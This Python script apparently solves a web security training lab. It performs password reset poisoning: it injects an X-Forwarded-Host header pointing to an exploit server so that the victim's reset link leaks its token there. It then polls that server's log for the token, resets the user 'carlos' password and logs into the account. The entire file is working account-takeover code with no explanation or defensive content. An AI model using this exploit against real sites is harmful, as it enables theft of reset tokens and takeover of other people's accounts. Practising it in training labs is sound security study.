import requests
import sys
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def send_vuln_mail(s, url, url_exploit):
    forgot_pass_url = url + '/forgot-password'
    payload = { 'username': 'carlos' }
    headers = { 'X-Forwarded-Host': url_exploit.split('//')[1] }
    r = s.post(forgot_pass_url, data=payload, headers=headers)

    print('Sent vulnerale email link to Carlos')    

def get_reset_password_token(s, url_exploit):
    log_url = url_exploit + '/log'
    print('Wait for vitim click injection page...')
    time.sleep(5)
    r = s.get(log_url)
    while 'temp-forgot-password-token' not in r.text:
        time.sleep(2)
        r = s.get(log_url)
    reset_pass_token = r.text.split('temp-forgot-password-token=')[-1].split(' HTTP')[0]
    return reset_pass_token

def reset_carlos_password(s, url, reset_pass_token, new_pass):
    reset_pass_url = url + '/forgot-password?temp-forgot-password-token=' + reset_pass_token
    payload = {
        'temp-forgot-password-token': reset_pass_token,
        'new-password-1': new_pass,
        'new-password-2': new_pass,
    }
    print('Reset Carlos password...')
    r = s.post(reset_pass_url, data=payload, headers=headers, allow_redirects=False)

    if r.status_code == 302:
        print('Success reset Carlos password')
    else:
        print('(-) Fail to reset Carlos password')

def login_carlos_acc(s, url, password):
    login_url = url + '/login'
    payload = {
        'username': 'carlos',
        'password': password,
    }
    print('Log in Carlos account...')
    r = s.post(login_url, data=payload, headers=headers, allow_redirects=True)

    if 'Log out' in r.text:
        print('Successful log in Carlos account')
        print('(+) Successful solved lab')
    else:
        print('(-) Fail to login Carlos account')

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <url_exploit>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.exploit_server.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    url_exploit = sys.argv[2]

    send_vuln_mail(s, url, url_exploit)
    reset_pass_token = get_reset_password_token(s, url_exploit)
    carlos_new_pass = 'aaa'
    reset_carlos_password(s, url, reset_pass_token, carlos_new_pass)
    login_carlos_acc(s, url, carlos_new_pass)

if __name__ == '__main__':
    main()